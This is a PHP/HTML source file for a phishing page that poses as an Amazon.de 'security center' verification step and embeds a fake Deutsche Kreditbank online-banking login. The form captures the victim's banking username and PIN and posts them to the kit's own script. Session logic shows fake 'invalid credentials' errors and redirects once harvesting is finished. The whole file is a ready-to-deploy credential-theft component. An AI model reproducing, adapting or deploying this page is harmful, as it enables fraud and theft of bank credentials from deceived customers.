<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-aui-build-date="3.17.4.2-2017-03-18">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<link rel="stylesheet" href="src/css/31O9784sOL.css">
		<link rel="stylesheet" href="src/css/61qjsbDraqL.css">
		<title><?php echo $title ?></title>
		<link rel="stylesheet" href="src/css/01IP25TkamL.css">
		<link rel="stylesheet" href="src/css/419ZIIK4ICL.css">
		<script src="src/dkb_js/base-3rd-party.js?etag=d9f3ee556f13aaa61df77e659d94f6d5a03ea3ec" type="text/javascript"></script>
		<script src="src/dkb_js/abaxx-scripts.js?etag=b3bfd1497ef6f82ec111a29849b9c271f10e51e4" type="text/javascript"></script>
		<script src="src/dkb_js/abaxx-widgets-session-info.js?etag=cc5b20bd00e2c4a2db1fa411d135af1ad06818f3" type="text/javascript"></script>
		<link rel="stylesheet" href="src/dkb_css/dkb_responsive.css">
		<link rel="stylesheet" href="src/dkb_css/dkb-classic.css">
		<link rel="stylesheet" href="src/dkb_css/dkb_responsive.min.css">
	</head>
	
	<body class="a-meter-animate">
		<style type="text/css">
			.nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
			  background-image: url(src/img/nav-sprite-global_bluebeacon-1x_optimized._CB295582946_.png);
			  background-position: 0 1000px;
			  background-repeat: repeat-x;
			}
			.nav-spinner {
			  background-image: url(src/img/snake._CB192194539_.gif);
			  background-position: center center;
			  background-repeat: no-repeat;
			}
			.nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
			  background-image: url(src/img/timeline_sprite_1x.png);
			  background-repeat: no-repeat;
			}
		</style>
		<link rel="stylesheet" href="src/css/719Je9HLSTL.css">
		<link rel="stylesheet" href="src/css/uDzwVmjTcOCPxHLlU3NYtRo6Q5Fev0GI729sXbWEn4.css">
		<a id="nav-top"></a>
		
		<header class="nav-locale-de nav-lang-de nav-ssl nav-unrec nav-paladin-ww nav-opt-sprite">
			<div id="navbar" role="navigation" class="nav-sprite-v1 nav-bluebeacon">
				<div id="nav-belt">
					<div class="nav-left">
						<div id="nav-logo">
							<a href="#" class="nav-logo-link" tabindex="2">
								<span class="nav-logo-base nav-sprite">Amazon.de</span>
								<span class="nav-logo-ext nav-sprite"></span>
								<span class="nav-logo-locale nav-sprite"></span>
							</a>

							<a href="#" aria-label="" tabindex="3" class="nav-logo-tagline nav-sprite nav-prime-try">
								Prime testen
							</a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-swmslot">
							<div id="navSwmHoliday" style="background-image: url(src/img/prime.jpg); width: 400px; height: 39px; overflow: hidden;position: relative;">
							<img alt="AIV" src="src/img/transparent-pixel.gif" usemap="#nav-swm-holiday-map" height="39px" border="0" width="400px"></div>
						</div>
					</div>
					
					<div class="nav-fill"></div>
				</div>
				
				<div id="nav-main" class="nav-sprite">
					<div class="nav-left">
						<div id="nav-shop">
							<a href="#" class="nav-a nav-a-2" id="nav-link-shopall" tabindex="10"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-tools">
							<a href="#" class="nav-a nav-a-2" data-nav-ref="nav_ya_signin" data-nav-role="signin" id="nav-link-yourAccount" tabindex="26" style="border-radius:3px;border: 1px solid #ccc;">
								<span class="nav-line-1">Hallo! Anmelden <span style="color:#FF9900">(Anmeldung nicht möglich! Verifikation erforderlich)</span></span>
								<span class="nav-line-2">Mein Konto<span class="nav-icon nav-arrow" style="visibility: visible;"></span></span>
							</a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-prime" tabindex="27"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-fill">
						<div id="nav-xshop-container" class="">
							<div id="nav-xshop">
								<a href="#" data-nav-tabindex="5" class="nav-a nav_a" id="nav-your-amazon">Anmeldung <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="22"> Bestätigung der persönlichen Daten <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="23"><span style="color:#FF9900">&#10148; Zahlungsmittel bestätigen</span></a>
								<a href="#" class="nav-a" tabindex="24">Abschließen <span style="color:red">&#10006;</span></a>
							</div>
						</div>
					</div>
				</div>
				<div id="nav-subnav" style=""></div>
			</div>
		</header>

		<style>
		  #nav-prime-tooltip{
			padding: 0 20px 2px 20px;
			background-color: white;
			font-family: arial,sans-serif;
		  }
		  .nav-npt-text-title{
			font-family: arial,sans-serif;
			font-size: 18px;
			font-weight: bold;
			line-height: 21px;
			color: #E47923;
		  }
		  .nav-npt-text-detail, a.nav-npt-a{
			font-family: arial,sans-serif;
			font-size: 12px;
			line-height: 14px;
			color: #333333;
			margin: 2px 0px;
		  }
		  a.nav-npt-a {
			text-decoration: underline;
		  }
		</style>
		
		<div class="cs-content">
			<div class="cs-contact-title">
				<h1>
					Amazon - Kundenservice Sicherheitscenter
				</h1>
			</div>
			
			<div>
				<div style="margin:0 auto;width:600px">
					<div>
						<div class="falcon">
							<br/>

							 <div id="dkb_banking_header" class="pint banking_header  clearfix " >
								<div class="header_inner_wrap">


									<a href="#mobile_menu" class="mobile_menu_btn ">
										<span class="menu_icon "></span>
										<span class="unread_count no_number"></span>
									</a>
									
									<span class="clearfix logo">
										<a href="" title="Link zur Startseite der Deutsche Kreditbank AG" class="clearfix" >
											<span class="dkb_logo_container"> </span>
										 </a>
									</span>
				

									<div id="session-info" class="bankingStatusBox loggedOut"></div>

								</div>
								
							</div>
							
							<div style="width:540px;margin:0 auto;background-color:#fff;height:310px">
								<div class="clearfixv module shadowBox applicationContainer">
									<div class="clearfix applicationForm">
										<form action="index.php" method="post" name="login" class="form" data-xpopup-mode="auto"><button style='position: absolute; left: -9999px; width: 1px; height: 1px;' name='hiddenSubmit' type='submit'>&nbsp;</button>
											<?php
												if (isset($_SESSION['usrErr']) || isset($_SESSION['passErr'])) {
													echo '<div class="clearfix module text errorMessage"><ul><li><span class="icons cross"></span>Der eingegebene Anmeldename und/oder die PIN ist nicht zulässig.</li></ul></div>';
													unset($_SESSION['usrErr']);
													unset($_SESSION['passErr']);
												}
											?>
											
											<fieldset>
												<h3 class="border">
													<span style="color:black">Anmeldung zum Internet-Banking</span>
												</h3>

												<p class="clearfix formBox">
													<span class="col50 floatLeft">
														<label for="loginInputSelector" class="headdetail" ><span>Anmeldename </span></label>
														<input class="field text small" name="dkb_username" type="text" maxlength="16" value="<?php echo (isset($_SESSION['dkb_username']) ? $_SESSION['dkb_username'] : ""); ?>" autocomplete='off' autocapitalize='off' tabindex='1' placeholder='Anmeldename' />
													</span>
													<span class="col50 floatRight formExe hide-for-small-down">
														  Der Anmeldename und die PIN unterscheiden sich, je nachdem, welches TAN-Verfahren Sie nutzen möchten.

													</span>
													<span class="col50 floatLeft">
														<br/>
														<label for="pinInputSelector" class="headdetail" ><span>PIN </span></label>
														<input class="field text small" name="dkb_pass" type="password" maxlength="5"  autocomplete='off' tabindex='2' placeholder='PIN'/>
														<p><a class="moreLink" href="#"><span class="icons arrowNext"></span>PIN vergessen</a></p>
														
													</span>
												</p>
											</fieldset>
											<div class="clearfix send">
												
												<div class="clearfix button">
													<button data-abx-jsevent="login" type="button" title="Anmelden" name="sendcode" data-xevent="login" class="clearfix submit evt-login submit" tabindex='3'><span class="abaxx-button-label">Bestätigen<span class="icons arrowButton0"></span></span></button>
												</div>
											</div>
											
											<input type="hidden" name="sendcode" value="sendcode" />
										</form>
									</div>
								</div>

							</div>
							<br/><br/>
						</div>
					</div>
				</div>
			</div>
			
		</div>
		<div id="navFooter" class="navLeftFooter nav-sprite-v1" style="width:100%;position:absolute;bottom:0"> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine"> <span> <div class="navFooterLine navFooterLogoLine"> <a href="#"> <div class="nav-logo-base nav-sprite"></div> </a> </div> </span> <span class="icp-container-desktop"> <div class="navFooterLine"> <style type="text/css">#icp-touch-link-country{display:none}#icp-touch-link-language{display:none}</style> <a href="#" class="icp-button a-declarative" id="icp-touch-link-language"> <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span> </a> <a href="#" class="icp-button a-declarative" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span> </a> </div> </span> </div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright"> <ul> <li class="nav_first"> <a href="#" class="nav_a">Unsere AGB</a> </li> <li> <a href="#" class="nav_a">Datenschutzerklärung</a> </li> <li> <a href="#" class="nav_a">Impressum</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Cookies &amp; Internet-Werbung</a> </li> </ul> <span>© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</span> </div> </div>
	</body>
</html>